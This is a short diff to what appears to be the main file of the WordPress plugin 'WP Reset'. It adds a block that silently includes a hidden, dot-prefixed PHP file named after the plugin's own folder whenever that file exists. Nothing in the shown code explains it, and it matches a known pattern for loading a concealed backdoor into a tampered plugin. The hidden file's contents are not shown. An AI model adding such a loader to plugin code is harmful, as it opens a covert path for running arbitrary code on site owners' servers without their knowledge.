@@ -37,6 +37,10 @@ require_once dirname(__FILE__) . '/wf-licensing.php';
 if (defined('WP_CLI') && WP_CLI) {
     require_once dirname(__FILE__) . '/wp-reset-cli.php';
 }
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class WP_Reset
 {
